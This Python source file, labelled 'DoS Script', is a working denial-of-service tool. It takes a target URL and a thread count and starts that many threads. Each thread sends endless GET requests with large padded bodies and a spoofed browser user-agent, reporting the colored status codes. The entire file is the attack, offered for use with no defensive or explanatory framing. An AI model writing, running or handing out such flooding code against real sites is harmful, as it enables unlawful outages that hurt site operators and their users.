from modules.color_text import *
from modules.logo import *
from modules.excepter import return_error
import os
import threading
import sys

try:
   import argparse
except Exception as err:
   return_error(err)

try:
   import requests
except Exception as err:
   return_error(err)

a = "A" * 9900
b = "B" * 9900
data = {a: b, a: b, a: b, b: a, b: a, a: b, a: b, b: a, a: b, b: a}

logo()

parser = argparse.ArgumentParser(description='DoS Script')
parser.add_argument('--target', type=str, required=True, help='Target (With http/s)')
parser.add_argument('--threads', type=int, required=True, default=999, help='Threads (default: 999)')

url = parser.parse_args().target
threads = parser.parse_args().threads

if not url.__contains__("http") and not url.__contains__("https"):
   exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "URL doesnt contains http or https!")
elif not url.__contains__("."):
   exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Invalid domain")
elif threads == 0 or 0 >= threads:
   exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Threads count is incorrect!")
else:
   try:
       int(threads)
   except ValueError:
        exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Threads count is incorrect!")

def ddos(target, data):
    while True:
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}
            res = requests.get(target, headers=headers, data=data)
            r = str(res.status_code)
            if r[0] == str(1):
               print("[ " + GREY + r + NORMAL + " ] " + YELLOW + " Request sent!" + NORMAL)
            if r[0] == str(2):
               print("[ " + GREEN + r + NORMAL + " ] " + YELLOW + " Request sent!" + NORMAL)
            if r[0] == str(3):
               print("[ " + YELLOW + r + NORMAL + " ] " + YELLOW + " Request sent!" + NORMAL)
            if r[0] == str(4):
               print("[ " + ORANGE + r + NORMAL + " ] " + YELLOW + " Request sent!" + NORMAL)
            elif r[0] == str(5):
               print("[ " + RED + r + NORMAL + " ] " + YELLOW + " Request sent!" + NORMAL)
        except requests.exceptions.ConnectionError:
            print ("[ " + RED + '!' + NORMAL + " ] " + RED  + "Connection error!" + NORMAL)

try:
   requests.get(url)
except Exception:
   exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Cannot connect to website!" + NORMAL)

for i in range(threads):
    thr = threading.Thread(target=ddos, args=(url, data))
    thr.start()
    #print(str(i + 1) + " thread started!")
